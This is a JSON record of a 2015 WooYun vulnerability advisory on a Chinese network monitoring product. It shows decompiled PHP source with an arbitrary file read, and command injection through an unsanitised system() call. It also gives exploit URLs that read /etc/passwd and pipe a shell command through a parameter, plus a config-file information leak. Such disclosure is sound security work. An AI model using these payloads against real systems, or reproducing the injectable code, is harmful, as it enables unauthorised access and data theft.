{"id": 70772, "wybug_id": "wooyun-2015-0123369", "wybug_title": "中科新业网络哨兵任意文件读取/命令执行/信息泄露", "wybug_corp": "中科新业", "wybug_author": "menmen519", "wybug_date": "2015-07-02 10:41", "wybug_open_date": "2015-10-01 13:40", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-03：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-07-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向公众公开  简要描述： 中科新业网络哨兵任意文件读取/命令执行/信息泄露 详细说明：  首先看文件读取:get_file.php:\n<?php/*********************//*                   *//*  Dezend for PHP5  *//*         NWS       *//*      Nulled.WS    *//*                   *//*********************/@set_time_limit( 60 );if ( isset( $_GET['view'] ) && file_exists( $_GET['view'] ) ){\t\t\t\theader( \"Content-Type: application/octet-stream\" );\t\t\t\theader( \"Content-Disposition: attachment; filename=\".basename( $_GET['view'] ) );\t\t\t\treadfile( $_GET['view'] );}else if ( isset( $_GET['view'] ) ){\t\t\t\techo $_GET['view'].\" 不能读取!\";}?>\n这个很简单 访问**.**.**.**/ucenter/include/get_file.php?view=/etc/passwd命令执行：send_cmd_start.php:\ninclude_once( \"../include/globalvar.h\" );include_once( \"../include/connectdb.php\" );include_once( \"../include/addsystemlog.php\" );include_once( \"../openssl/maintain_cmd_send.php\" );require_once( \"../include/remoteconfig.php\" );require_once( \"../include/remotelang_{$charset}.php\" );if ( $sesstion_lang == \"3\" ){\t\t\t\t$remotehelp = $remotelang['en']['sendremoterequest'];}else if ( $sesstion_lang == \"2\" ){\t\t\t\t$remotehelp = $remotelang['big5']['sendremoterequest'];}else{\t\t\t\t$remotehelp = $remotelang['gb']['sendremoterequest'];}global $sUserId;addsystemlog( $sUserId.\"{$remotehelp}!\" );session_start( );session_destroy( );$status = trim( file_get_contents( \"../../progress.ini\" ) );$start_time = date( \"Y-m-d H:i:s\" );if ( $status == \"-d\" || $status == \"-f\" || $status == \"-n\" ){\t\t\t\tsetsystemconfigvalue( \"gStartMaintainTime\", strtotime( $start_time ) );}$gStartMaintainTime = getsystemconfigvaluewh( \"gStartMaintainTime\" );if ( $gStartMaintainTime == 0 || $status == \"-d\" || $status == \"-f\" || $status == \"-n\" ){\t\t\t\t$ServerHost = $_SERVER['SERVER_NAME'];\t\t\t\t$gMaintainCmd = new MaintainCmd( );\t\t\t\t$date = date( \"Y-m-d H:i:s\", time( ) );\t\t\t\t$gMaintainCmd->SetPubKey( \"../openssl/client.crt\", 1 );\t\t\t\t$gMaintainCmd->connect( $ServerHost, 7002 );\t\t\t\t$gMaintainCmd->SendCmd( \"4001\", \"\" );}$sourcefilepath = $gAbsoultPath.\"systemMT.php\";$desfilepath = $gAbsoultPath.\"index.php\";system( \"cp -f {$sourcefilepath} {$desfilepath}\" );\n访问url：**.**.**.**/ucenter/remotewh/sendcmd_start.php?gAbsoultPath=x | cat /etc/passwd > a.txt | 然后访问**.**.**.**/ucenter/remotewh/a.txt\n\n下来看信息泄露，在php环境中.h文件是不被解析的，如果需要解析，必须在配置文件里面做配置访问**.**.**.**/ucenter/include/globalvar_center.h\n\n搜索一下\n\n例子： eg: **.**.**.**/ucenter/ **.**.**.**/ucenter/ **.**.**.**/ucenter/ **.**.**.**/ucenter/ **.**.**.**/ucenter/   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-07-03 13:39 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}